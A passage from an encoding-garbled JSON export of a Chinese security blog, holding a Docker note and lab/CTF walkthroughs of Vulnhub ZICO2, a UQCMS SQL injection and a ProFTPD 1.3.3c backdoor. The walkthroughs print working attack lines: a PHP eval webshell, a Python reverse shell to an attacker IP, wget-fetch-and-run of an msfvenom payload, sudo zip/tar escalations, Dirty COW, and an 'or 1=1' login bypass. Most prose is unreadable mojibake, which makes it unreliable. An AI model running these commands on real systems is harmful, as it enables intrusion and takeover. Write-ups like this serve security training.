ä¸‰ã€å›é¡¾hello-worldæµç¨‹ å››ã€åº•å±‚åŸç†1ã€Dockeræ˜¯æ€ä¹ˆå·¥ä½œçš„&emsp;&emsp;Dockeræ˜¯ä¸€ä¸ªClient-Serverç»“æ„çš„ç³»ç»Ÿï¼ŒDockerçš„å®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨ä¸»æœºä¸Šï¼Œé€šè¿‡Socketä»å®¢æˆ·ç«¯è®¿é—®ã€‚ &emsp;&emsp;DockerServeræ¥æ”¶åˆ°Docker-Clientçš„æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªå‘½ä»¤ 2ã€Dockerä¸ºä»€ä¹ˆæ¯”VMå¿«&emsp;&emsp;Dockeræœ‰ç€æ¯”è™šæ‹Ÿæœºæ›´å°‘çš„æŠ½è±¡å±‚ &emsp;&emsp;Dockeråˆ©ç”¨çš„æ˜¯å®¿ä¸»æœºçš„å†…æ ¸ï¼ŒVMéœ€è¦æ˜¯Guset OS &emsp;&emsp;æ‰€ä»¥è¯´ï¼Œæ–°å»ºä¸€ä¸ªå®¹å™¨çš„æ—¶å€™ï¼Œdockerä¸éœ€è¦åƒè™šæ‹Ÿæœºä¸€æ ·é‡æ–°åŠ è½½ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œé¿å…å¼•å¯¼ã€‚è™šæ‹Ÿæœºæ˜¯åŠ è½½Guest OSï¼Œåˆ†é’Ÿçº§åˆ«çš„ï¼Œè€ŒDockeræ˜¯åˆ©ç”¨å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œçœç•¥äº†è¿™ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œç§’çº§ï¼","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"Vulnhubâ€”â€”ZICO2:1","slug":"Vulnhubâ€”â€”ZICO2-1","date":"2021-12-08T16:02:21.000Z","updated":"2022-01-03T03:30:11.867Z","comments":true,"path":"post/da4faa60.html","link":"","permalink":"https://wolke.cn/post/da4faa60.html","excerpt":"","text":"ä¸€ã€é¶æœºè¯´æ˜1ã€ä¸‹è½½é“¾æ¥&emsp;&emsp;é¶åœºé•œåƒï¼šé“¾æ¥: https://www.vulnhub.com/entry/zico2-1,210/ 2ã€é¶æœºå‡†å¤‡ï¼ˆ1ï¼‰é‡ç½®é¶åœºå¯†ç &emsp;&emsp;é‡å¯ä¸»æœºï¼Œç–¯ç‹‚æŒ‰shiftï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢åï¼ŒæŒ‰e &emsp;&emsp;æ‰¾åˆ°linuxå¼€å¤´çš„è¡Œï¼Œåœ¨æœ€åè¾“å…¥ init=/bin/bashï¼Œè¾“å…¥å®ŒæˆåæŒ‰Crtl+X &emsp;&emsp;mount -o rw,remount /ï¼Œå›è½¦ &emsp;&emsp; passwd rootï¼Œè¾“å…¥æ–°å¯†ç ä¸¤æ¬¡ &emsp;&emsp;å¦‚æœæç¤ºæ”¹å˜å¯†ç æˆåŠŸï¼Œé‡å¯è¯¥è™šæ‹Ÿæœº ï¼ˆ2ï¼‰æŸ¥çœ‹IP&emsp;&emsp;ä½¿ç”¨åˆšæ‰ä¿®æ”¹çš„å¯†ç è¿›å…¥é¶åœºä¸»æœºï¼Œè¾“å…¥ip aï¼ŒæŸ¥çœ‹IPåœ°å€ ä¸‰ã€ä¿¡æ¯æ”¶é›†1ã€æ¢æµ‹ä¸»æœºIP&emsp;&emsp;ä½¿ç”¨arp-scanæ¢ç´¢é¶æœºIPï¼Œå‘ç°IPåœ°å€ä¸º192.168.1.107 arp-scan -l 2ã€å¼€æ”¾ç«¯å£ä¸æœåŠ¡æ‰«æ&emsp;&emsp;ä½¿ç”¨nmapå¯¹IPè¿›è¡Œæ‰«æï¼š nmap -sV 192.168.1.107 &emsp;&emsp;å¯ä»¥çœ‹åˆ°å¼€å¯äº†SSHï¼ŒHTTPç­‰æœåŠ¡ 111ç«¯å£RPCBINDç”¨äºå–ä»£æ—§ç‰ˆæœ¬ä¸­çš„portmapç»„ä»¶ã€‚ç®€å•è¯´ï¼ŒRPCBINDå°±æ˜¯ä¸ºäº†å°†ä¸åŒæœåŠ¡ä¸å¯¹åº”çš„ç«¯å£è¿›è¡Œç»‘å®šï¼Œä»¥ä¾¿æ”¯æŒæœºå™¨é—´çš„ç›¸äº’æ“ä½œ &emsp;&emsp;è®¿é—®80ç«¯å£çš„æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªç½‘ç«™ 3ã€ç›®å½•æ‰«æ&emsp;&emsp;ä½¿ç”¨dirsearchæ‰«æ dirsearch -u http://192.168.43.8 &emsp;&emsp;æ‰«å‡ºäº†ä¸ª/dbadminç›®å½•å¾ˆå¯ç–‘ &emsp;&emsp;è®¿é—®è¯¥ç›®å½•ï¼Œå‘ç°æœ‰ä¸ªPHPæ–‡ä»¶ï¼Œç‚¹å‡»è®¿é—®ï¼Œå‘ç°æ˜¯ä¸ªåå°ç™»å½•é¡µé¢ï¼Œå¹¶ä¸”æç¤ºäº†æ¡†æ¶ä¿¡æ¯ï¼ŒphpLiteAdmin 1.9.3ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªè¿œç¨‹phpä»£ç æ‰§è¡Œæ¼æ´ å››ã€æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨1ã€Owasp-zapæ‰«æ&emsp;&emsp;ä½¿ç”¨owasp-zapå¯¹ç½‘ç«™è¿›è¡Œæ‰«æï¼Œowasp-zapæ˜¯ä¸€ä¸ªå¯¹ç½‘ç«™è¿›è¡Œè‡ªåŠ¨æ¼æ´æ‰«æçš„å·¥å…· &emsp;&emsp;æ‰«æç»“æŸï¼ŒAlertsä¸€æ ä¸ºæœ‰æ¼æ´çš„åœ°æ–¹ï¼Œæ——å­è¡é¢œè‰²è¶Šèƒœä»£è¡¨æ¼æ´è¶Šä¸¥é‡ï¼Œè¿™é‡Œå‘ç°å…¶ä¸­æœ‰ä¸€ä¸ªç›®å½•éå†çš„æ¼æ´ï¼Œhttp://192.168.43.8/view.php?page=../../../../../../etc/passwdï¼Œè¿›å…¥è¯¥é¡µé¢å‘ç°çš„ç¡®çˆ†å‡ºäº†ç”¨æˆ·åçš„ç›¸å…³ä¿¡æ¯ &emsp;&emsp;è¿™é‡Œå…¶å®ä¹Ÿå¯ä»¥åœ¨ä¸»é¡µï¼Œç‚¹å‡»CHENC THEM OUT!æŒ‰é’®ï¼Œä¼šå‘ç°URLå˜æˆäº†http://192.168.43.8/view.php?page=tools.htmlï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å‘ç°çš„ç¡®å­˜åœ¨æ–‡ä»¶åŒ…å« &emsp;&emsp;åªè¦çœ‹åˆ°æ–‡ä»¶åŒ…å«è¿™ç§URLè·¯å¾„ï¼Œå°±è¦æƒ³åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç‚¹ 1ã€ ä»»æ„urlè·³è½¬2ã€ Ssrf3ã€ æ–‡ä»¶åŒ…å«4ã€ Sqlæ³¨å…¥ 2ã€çˆ†ç ´å¯†ç &emsp;&emsp;åå°ç™»å½•åªéªŒè¯äº†å¯†ç ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨å­—å…¸å¯¹å…¶è¿›è¡Œçˆ†ç ´ï¼Œæˆ–è€…ä½¿ç”¨å¼±å£ä»¤ï¼Œè¿™é‡Œå¯†ç æ˜¯adminï¼Œç›´æ¥è¿›å…¥åå° 3ã€ä¿¡æ¯æœé›†&emsp;&emsp;åœ¨usersè¡¨å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªç”¨æˆ·ä¿¡æ¯ &emsp;&emsp;ä¸¢åˆ°md5è§£å¯†çœ‹çœ‹ &emsp;&emsp;å¾—åˆ°ä¸¤ä¸ªè´¦å·å¯†ç  ç”¨æˆ·åï¼šroot å¯†ç ï¼š34kroot34 ç”¨æˆ·åï¼šzico å¯†ç ï¼šzico2215@ &emsp;&emsp;ä½¿ç”¨searchsploit phpliteadminå‘½ä»¤ï¼Œæœç´¢æ˜¯å¦æœ‰èƒ½å¤Ÿåˆ©ç”¨çš„EXPï¼Œå‘ç°ç¡®å®å­˜åœ¨å¯¹åº”ç‰ˆæœ¬çš„åˆ©ç”¨è„šæœ¬ &emsp;&emsp;æŸ¥çœ‹è¯´æ˜ï¼Œæ„æ€å°±æ˜¯å¯ä»¥åˆ©ç”¨phpLiteAdminï¼Œåˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“åç§°èµ·åä¸ºxx.phpï¼Œå¦‚æœåç«¯æ²¡æœ‰è¿™ä¸ªæ•°æ®åº“ï¼Œæ¯”å¦‚hack.phpï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ•°æ®åº“åç§°çš„æ–‡ä»¶ï¼Œç„¶ååœ¨é‡Œé¢å¡«å……æ•°æ®ï¼Œæ¯”å¦‚&lt;?php phpinfo()?&gt;ï¼Œç„¶åè®¿é—®ï¼Œä¼šå‘ç°æ‰§è¡ŒæˆåŠŸ &emsp;&emsp;è¿™é‡Œæˆ‘æœ‰ä¸¤ä¸ªæƒ³æ³• ç”¨SSHç™»å½•è´¦å·å¯†ç ï¼Œçœ‹èƒ½å¦æˆåŠŸ åˆ©ç”¨phpLiteAdmin 1.9.3ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªè¿œç¨‹phpä»£ç æ‰§è¡Œæ¼æ´ æƒ³æ³•ä¸€ï¼šç”¨SSHç™»å½•&emsp;&emsp;å‘ç°äº‹æƒ…å¹¶ä¸ç®€å•ï¼Œç™»å½•å¤±è´¥ã€‚ æƒ³æ³•äºŒï¼šåˆ©ç”¨è¿œç¨‹phpä»£ç æ‰§è¡Œæ¼æ´&emsp;&emsp;æ­¥éª¤ä¸€ï¼šè¿”å›åˆ°æ•°æ®åº“ç®¡ç†é¡µé¢å…ˆåˆ›é€ ä¸€ä¸ª.phpæ–‡ä»¶ä½œä¸ºæ•°æ®åº“ &emsp;&emsp;æ­¥éª¤äºŒï¼šåœ¨è¯¥æ•°æ®åº“ï¼ˆphpæ–‡ä»¶ä¸‹ï¼‰åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨aï¼ˆéšä¾¿è®¾ç½®åå­—ï¼‰ &emsp;&emsp;æ­¥éª¤ä¸‰ï¼šåœ¨Default Valueä¸‹æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼ˆå› ä¸ºåœ¨è¿™é‡Œä¸Šä¼ çš„ä¸€å¥è¯ä¸­å¼•å·ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸€å¥è¯ä¸å«å•å¼•å·ï¼›ï¼‰ &lt;?php @eval($_REQUEST[ok]);?&gt; &emsp;&emsp;ä½¿ç”¨æ–‡ä»¶åŒ…å«ä¸€å¥è¯æœ¨é©¬ &emsp;&emsp;æ­¥éª¤äº”ï¼šä¸Šèœåˆ€ï¼Œåªæ˜¯www-dataè¿˜ä¸æ˜¯æœ€é«˜çš„rootæƒé™ äº”ã€åå¼¹shellæ–¹æ³•ä¸€ï¼špythonåå¼¹shell&emsp;&emsp;åœ¨kaliç«¯ç›‘å¬å¹¶ä¸”å¼€æ”¾ç«¯å£4444ï¼Œåœ¨é¡µé¢urlä½¿ç”¨ä»¥ä¸‹pyhonåshellçš„payload http://192.168.43.8/view.php?page=../../../../../usr/databases/w01ke.php&amp;ok=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.43.167&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; æ–¹æ³•äºŒï¼šåˆ©ç”¨phpåshell&emsp;&emsp;æ€è·¯ï¼šç”¨kaliä¸‹msfvenomç”Ÿæˆä¸€ä¸ªåé—¨æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨ä¹‹å‰çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œè®©é¶æœºå°†åé—¨æ–‡ä»¶ä¸»åŠ¨ä¸‹è½½åˆ°æœ¬æœºï¼Œç„¶åå¼¹å›shell &emsp;&emsp;é¦–å…ˆåˆ›å»ºåé—¨æ–‡ä»¶ï¼Œåå­—ä¸ºshellå‘½ä»¤ä¸ºï¼š msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.167 LPORT=5555 -f elf -o shell &emsp;&emsp;æ‰§è¡Œå‘½ä»¤ cp shell /var/www/htmlï¼Œå°†åé—¨æ–‡ä»¶å¤åˆ¶åˆ°apacheçš„ç½‘ç«™æ ¹ç›®å½• &emsp;&emsp;æ‰§è¡Œå‘½ä»¤ chmod 777 /var/www/html/shellï¼Œèµ‹äºˆåé—¨æ–‡ä»¶å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™ &emsp;&emsp;æ‰§è¡Œå‘½ä»¤ service apache2 startï¼Œå¯åŠ¨æ”»å‡»æœºçš„apacheæœåŠ¡ &emsp;&emsp;msfconsoleç›‘å¬ use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 192.168.43.167set LPORT 5555exploit &emsp;&emsp;åˆ©ç”¨ä¹‹å‰ä¸Šä¼ çš„ä¸€å¥è¯ï¼Œè®©é¶æœºä¸»åŠ¨ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œåå¼¹shell ok=system(&quot;cd /tmp;wget http://192.168.43.167/shell;chmod 777 shell;./shell&quot;); &emsp;&emsp;è¿›å…¥shellï¼Œè°ƒç”¨äº¤äº’å¼å‘½ä»¤è¡Œï¼ŒåŒæ—¶ç¾åŒ–å‘½ä»¤è¡Œ python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; å…­ã€ææƒ&emsp;&emsp;è¿›å…¥åˆ°/homeç›®å½•ï¼ŒæŸ¥çœ‹æ–‡ä»¶ï¼Œå‘ç°æ‰€è¦è¿›è¡Œçš„ä¸‹ä¸€æ­¥æ“ä½œæç¤º &emsp;&emsp;è¿›å…¥åˆ°wordpressç›®å½•ä¸‹ï¼Œå‘ç°wordpressé…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨catå‘½ä»¤æŸ¥çœ‹åˆ°è´¦å·å¯†ç ï¼ˆå¦‚æœæ­¤æ—¶çœ‹ä¸åˆ°ï¼Œé‚£ä¹ˆåˆ°meterpreterç•Œé¢ï¼Œåˆ©ç”¨downloadå‘½ä»¤ï¼Œå°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡ŒæŸ¥çœ‹download /home/zico/wordpress/wp-config.php /rootï¼‰ &emsp;&emsp;å°è¯•ç”¨å¾—åˆ°çš„è´¦å·å¯†ç ï¼Œé€šè¿‡22ç«¯å£çš„sshç™»å½•ä¸»æœºï¼Œç™»å½•æˆåŠŸ &emsp;&emsp;ä¸‹ä¸€æ­¥å°±æ˜¯è¿›è¡Œææƒï¼Œè·å¾—rootæƒé™ï¼Œæ¥å¾—åˆ°æœ€åçš„flag 1ã€zipææƒ&emsp;&emsp;æ‰§è¡Œå‘½ä»¤ï¼šsudo -lï¼ŒæŸ¥çœ‹å“ªäº›å‘½ä»¤å…·æœ‰rootæƒé™ï¼Œå‘ç°å…·æœ‰rootæƒé™çš„ä¸ºä¸¤ä¸ªè§£å‹ç”¨çš„å‘½ä»¤å¯æ‰§è¡Œ &emsp;&emsp;å¯ä»¥åˆ©ç”¨zipå‘½ä»¤æ¥è¿›è¡Œææƒ &emsp;&emsp;åœ¨/tmpç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªexploitåå­—çš„æ–‡ä»¶ touch /tmp/exploit &emsp;&emsp;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼ŒææƒæˆåŠŸï¼ŒæŸ¥çœ‹flag sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;sh -c /bin/bash&quot; 2ã€tarææƒsudo /bin/tar cf /dev/null /pwnd --checkpoint=1 --checkpoint-action=exec=/bin/bash 3ã€è„ç‰›ææƒwget http://192.168.43.167/dirty.c -O /tmp/dirty.cgcc -pthread dirty.c -o exp -lcrypt # ç¼–è¯‘./exp w01ke # ä½¿ç”¨expï¼Œåé¢çš„w01keæ˜¯å¯†ç  äº”ã€æ€»ç»“&emsp;&emsp;è¿™ç§è‡ªè§£å‹çš„tarå’Œzipææƒï¼Œéœ€è¦å¾ˆå¤šå‰ææ¡ä»¶ï¼ŒçœŸå®ç¯å¢ƒä¸­ç®¡ç†å‘˜ä¹Ÿä¸ä¼šå•ç‹¬ç»™æŸä¸ªç”¨æˆ·zipè¿™æ ·çš„æƒé™ï¼Œè¿™ç§ææƒæ–¹å¼CTFæˆ–è®¸ä¼šç”¨åˆ°ï¼Œä½†æ˜¯å®é™…ç¯å¢ƒåŸºæœ¬ä¸ä¼šæœ‰ç”¨","categories":[{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"}],"author":"w01ke"},{"title":"UQCMSâ€”â€”SQLæ³¨å…¥","slug":"UQCMSâ€”â€”SQLæ³¨å…¥","date":"2021-12-08T15:07:37.000Z","updated":"2022-01-03T03:30:02.308Z","comments":true,"path":"post/6f0081d7.html","link":"","permalink":"https://wolke.cn/post/6f0081d7.html","excerpt":"","text":"ä¸€ã€é¶åœºæè¿°&emsp;&emsp;é¶åœºåœ°å€ï¼š10.1.0.101 äºŒã€ä¿¡æ¯æœé›†&emsp;&emsp;ä½¿ç”¨æ‰«æå™¨æ‰«æç½‘ç«™ç›®å½•ï¼Œå¯ä»¥æ‰«åˆ°ä¸€ä¸ªadminad.phpçš„phpæ–‡ä»¶ ä¸‰ã€æ¼æ´åˆ©ç”¨â€”â€”SQLæ³¨å…¥&emsp;&emsp;ç”¨æˆ·åï¼š&#39; or 1=1#å³å¯ç™»å½•åå° å››ã€ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬&emsp;&emsp;å¯¹å…¶ä¸­ä»»æ„ä¸€ä¸ªhtmlæ–‡ä»¶è¿›è¡Œä¿®æ”¹ &emsp;&emsp;éšä¾¿è¾“å…¥ä¸€ä¸ªhahaï¼ŒæŠ“åŒ…çœ‹çœ‹è¿™ä¸ªåŒ…æ˜¯æ€ä¹ˆæ ·çš„ï¼Œå¯ä»¥çœ‹åˆ°POSTä¸­content=hahaï¼Œhahaå°±æ˜¯æˆ‘ä¿®æ”¹çš„ä»£ç ï¼Œè¯´æ˜contentå‚æ•°æ˜¯ä¼ å…¥ä»£ç çš„ï¼›å¦å¤–è¿˜æœ‰ä¸ªpath=header.htmlï¼Œå‘ç°è·¯å¾„ä¹Ÿæ˜¯æäº¤å†…å®¹å¦‚æœè®¾ä¸ºpath=./xdd.phpï¼Œé‚£ä¹ˆç†è®ºä¸Šå°±å¯ä»¥å°†è¯¥æ–‡ä»¶å‘½åä¸ºxdd.phpä¸Šä¼ æäº¤åˆ°å½“å‰ç›®å½•ã€‚ &emsp;&emsp;åœ¨contentä¸€æ ä¸­åŠ å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶å°†è·¯å¾„è®¾ä¸ºxdd.phpï¼Œæ”¾åŒ…æäº¤ï¼Œå³å¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ &emsp;&emsp;ä½¿ç”¨èœåˆ€è¿æ¥ä¸€å¥è¯æœ¨é©¬å³å¯","categories":[{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"UQCMS","slug":"UQCMS","permalink":"https://wolke.cn/tags/UQCMS/"}],"author":"w01ke"},{"title":"FTPåé—¨æœåŠ¡â€”â€”ProFTPD 1.3.3cæ¼æ´åˆ©ç”¨","slug":"FTPåé—¨æœåŠ¡â€”â€”ProFTPD-1-3-3cæ¼æ´åˆ©ç”¨","date":"2021-12-08T14:02:50.000Z","updated":"2022-01-03T03:27:31.806Z","comments":true,"path":"post/b4a57078.html","link":"","permalink":"https://wolke.cn/post/b4a57078.html","excerpt":"","text":"ä¸€ã€é¶åœºè¯´æ˜1ã€ä¸‹è½½é“¾æ¥&emsp;&emsp;é“¾æ¥ï¼šhttps://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg æå–ç ï¼šo7cs 2ã€é¶æœºå‡†å¤‡ï¼ˆ1ï¼‰ç™»å½•&emsp;&emsp;ç”¨æˆ·åï¼šmarlinspike &emsp;&emsp;å¯†ç ï¼šmarlinspike ï¼ˆ2ï¼‰æŸ¥çœ‹IP&emsp;&emsp;ä½¿ç”¨åˆšæ‰ä¿®æ”¹çš„å¯†ç è¿›å…¥é¶åœºä¸»æœºï¼Œè¾“å…¥ip aï¼ŒæŸ¥çœ‹IPåœ°å€ äºŒã€ä¿¡æ¯æœé›†1ã€å‘ç°é¶æœºIP&emsp;&emsp;å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼šarp-scanå’Œnetdiscover ï¼ˆ1ï¼‰arp-scan&emsp;&emsp;ä½¿ç”¨arp-scanæ¢ç´¢é¶æœºIPï¼Œå‘ç°IPåœ°å€ä¸º192.168.43.165 arp-scan -l ï¼ˆ2ï¼‰netdiscover&emsp;&emsp;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹Kaliæœ¬æœºIPä¸º192.168.1.108 ip a &emsp;&emsp;ä½¿ç”¨netdiscoverå‘½ä»¤ netdiscover -r ip/å­ç½‘æ©ç  å‘½ä»¤æ¥æ¢æµ‹é¶æœº netdiscover -r 192.168.1.1/24 2ã€å¼€æ”¾ç«¯å£ä¸æœåŠ¡æ¢æµ‹&emsp;&emsp;å¯¹IPåœ°å€è¿›è¡Œæ‰«æ nmap -sV 192.168.1.103 &emsp;&emsp;å‘ç°å¼€å¯äº†FTPæœåŠ¡ï¼Œä¸”ç‰ˆæœ¬ä¸º ProFTPD 1.3.3cï¼Œè€Œè¯¥ç‰ˆæœ¬çš„FTPæ˜¯å­˜åœ¨æ¼æ´çš„ ä¸‰ã€æ¼æ´åˆ©ç”¨1ã€æœç´¢æ¼æ´exploit&emsp;&emsp;Kaliä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦æœ‰æ¼æ´åˆ©ç”¨æ¨¡å— searchsploit ProFTPD 1.3.3c &emsp;&emsp;æ‰“å¼€msfï¼Œæœç´¢è¯¥ç‰ˆæœ¬FTPï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ¼æ´åˆ©ç”¨æ¨¡ï¼Œå‘ç°æ¼æ´åˆ©ç”¨æ¨¡å— search ProFTPD 1.3.3c 2ã€exploituse exploit/unix/ftp/proftpd_133c_backdoor # ä½¿ç”¨è¯¥æ¼æ´æ¨¡å—show payloads # æŸ¥çœ‹å¯ä½¿ç”¨çš„payloadset payload cmd/unix/reverse # é€‰æ‹©è¯¥æ”»å‡»è½½è·set RHOSTS [é¶æœºIP] # è®¾ç½®ç›®æ ‡IPset LHOST [æ”»å‡»æœºIP] # è®¾ç½®æœ¬åœ°IPexploit # å‘èµ·æ”»å‡» 3ã€ææƒ&emsp;&emsp;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ç›¸å…³ä¿¡æ¯ï¼Œå‘ç°å·²ç»æ˜¯rootæƒé™äº†ï¼Œæ— éœ€ææƒ idwhoamipwd &emsp;&emsp;pythonè°ƒç”¨æœ¬åœ°shellå®ç°äº¤äº’å¼å‘½ä»¤è¡Œï¼ŒåŒæ—¶ç¾åŒ–å‘½ä»¤è¡Œ python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; å››ã€å……ç”µç«™1ã€ä»€ä¹ˆæ˜¯FTP&emsp;&emsp;æ˜¯æ–‡ä»¶ä¼ è¾“åè®®çš„ç®€ç§°ã€‚ç”¨äºInternetä¸Šçš„æ§åˆ¶æ–‡ä»¶çš„åŒå‘ä¼ è¾“ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆApplicationï¼‰ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒæŠŠè‡ªå·±çš„PCæœºä¸ä¸–ç•Œå„åœ°æ‰€æœ‰è¿è¡ŒFTPåè®®çš„æœåŠ¡å™¨ç›¸è¿ï¼Œè®¿é—®æœåŠ¡å™¨ä¸Šçš„å¤§é‡ç¨‹åºå’Œä¿¡æ¯ã€‚ &emsp;&emsp;FTP æ˜¯å› ç‰¹ç½‘ç½‘ç»œä¸Šå†å²æœ€æ‚ ä¹…çš„ç½‘ç»œå·¥å…·ï¼Œä» 1971 å¹´ç”± A KBHUSHAN æå‡ºç¬¬ä¸€ä¸ª FTP çš„RFCï¼ˆRFC114ï¼‰è‡³ä»Šè¿‘åŠä¸ªä¸–çºªæ¥ï¼ŒFTP å‡­å€Ÿå…¶ç‹¬ç‰¹çš„ä¼˜åŠ¿ä¸€ç›´éƒ½æ˜¯å› ç‰¹ç½‘ä¸­æœ€é‡è¦ã€æœ€å¹¿æ³›çš„æœåŠ¡ä¹‹ä¸€ã€‚ &emsp;&emsp;FTP çš„ç›®æ ‡æ˜¯æé«˜æ–‡ä»¶çš„å…±äº«æ€§ï¼Œæä¾›éç›´æ¥ä½¿ç”¨è¿œç¨‹è®¡ç®—æœºï¼Œä½¿å­˜å‚¨ä»‹è´¨å¯¹ç”¨æˆ·é€æ˜å’Œå¯é é«˜æ•ˆåœ°ä¼ é€æ•°æ®ã€‚å®ƒèƒ½æ“ä½œä»»ä½•ç±»å‹çš„æ–‡ä»¶è€Œä¸éœ€è¦è¿›ä¸€æ­¥å¤„ç†ï¼Œå°±åƒMIMEæˆ–Unicodeä¸€æ ·ã€‚ä½†æ˜¯ï¼ŒFTPæœ‰ç€æé«˜çš„å»¶æ—¶ï¼Œè¿™æ„å‘³ç€ï¼Œä»å¼€å§‹è¯·æ±‚åˆ°ç¬¬ä¸€æ¬¡æ¥æ”¶éœ€æ±‚æ•°æ®ä¹‹é—´çš„æ—¶é—´ï¼Œä¼šéå¸¸é•¿ï¼›å¹¶ä¸”ä¸æ—¶çš„å¿…é¡»æ‰§è¡Œä¸€äº›å†—é•¿çš„ç™»å½•è¿›ç¨‹ 2ã€searchsploitæ˜¯ä»€ä¹ˆ&emsp;&emsp;é¡¾åæ€ä¹‰ï¼Œå®ƒå°†æœç´¢æ‰€æœ‰çš„æ¼æ´å’Œshellcodeã€‚å®ƒä¸ä¼šåŒ…å«ä»»ä½•æ–‡ä»¶å’Œè°·æ­Œé»‘å®¢æ•°æ®åº“çš„ç»“æœ &emsp;&emsp;searchSploitä¸ºæ‚¨æä¾›äº†åœ¨æœ¬åœ°ä¿å­˜çš„å­˜å‚¨åº“ä¸­æ‰§è¡Œè¯¦ç»†çš„ç¦»çº¿æœç´¢çš„èƒ½åŠ›ã€‚è¿™ç§èƒ½åŠ›ç‰¹åˆ«é€‚ç”¨äºåœ¨æ²¡æœ‰äº’è”ç½‘æ¥å…¥çš„æƒ…å†µä¸‹å¯¹ç½‘ç»œè¿›è¡Œå®‰å…¨è¯„ä¼°ã€‚è®¸å¤šæ¼æ´éƒ½åŒ…å«äº†äºŒè¿›åˆ¶æ–‡ä»¶çš„é“¾æ¥ï¼Œè¿™äº›æ–‡ä»¶ä¸åŒ…å«åœ¨æ ‡å‡†å­˜å‚¨åº“ä¸­ï¼Œä½†å¯ä»¥åœ¨æˆ‘ä»¬çš„Exploit-DBäºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚ &emsp;&emsp;å¦‚æœæ‚¨é¢„è®¡æ‚¨å°†åœ¨ä¸€ä¸ªæ²¡æœ‰Internetçš„ç½‘ç»œç¯å¢ƒè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œè¯·ç¡®ä¿æ‚¨æ£€æŸ¥äº†ä¸¤ä¸ªå­˜å‚¨åº“ï¼Œä»¥è·å¾—æœ€å®Œæ•´çš„æ•°æ®é›†","categories":[{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"FTP","slug":"FTP","permalink":"https://wolke.cn/tags/FTP/"}],"author":"w01ke"},{"title":"Webå‘½ä»¤æ‰§è¡Œ+SSH","slug":"Webå‘½ä»¤æ‰§è¡Œ+SSH","